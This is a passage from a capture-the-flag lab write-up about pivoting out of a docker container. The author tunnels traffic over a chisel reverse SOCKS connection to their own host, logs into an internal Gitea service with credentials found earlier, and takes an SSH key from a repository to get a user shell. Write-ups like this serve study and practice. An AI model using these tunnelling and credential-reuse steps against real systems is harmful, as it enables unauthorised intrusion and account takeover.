## Gitea
Now that I have a reverse shell, I notice I am in a docker container. There are a number of things I could try to pivot, but this is an easy box and normally with CTFs the way forward should be relatively clear...
- Remember the filtered port from the initial nmap? Try hitting that endpoint from the docker and find that it is accessible 
- Use chisel to set up a HTTP proxy so that I can navigate to the endpoint using my local browser.
```bash
# On my local box:
$ ./chisel server -p 8001 --reverse
2022/09/09 14:25:20 server: Reverse tunnelling enabled
2022/09/09 14:25:20 server: Fingerprint 8KPkFmp6RQoci/7kPCvq11JpIoGX3Lwl+0iuD+psdQ4=
2022/09/09 14:25:20 server: Listening on http://0.0.0.0:8001
2022/09/09 14:26:09 server: session\#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening

# On the docker:
$ ./chisel client 10.10.14.4:8001 R:socks
2022/09/09 19:26:09 client: Connecting to ws://10.10.14.4:8001
2022/09/09 19:26:09 client: Connected (Latency 36.472421ms)
```
Then just set up a proxy through localhost:1080 like I do for Burp Suite and try and navigate to the page...
![[Pasted image 20220909143158.png]]
Now try out those creds that were found earlier? 
![[Pasted image 20220909143536.png]]
Check out the one repo that I see and it contains a copy of the user's home directory which has a valid ssh key. Use that to get a shell as user dev01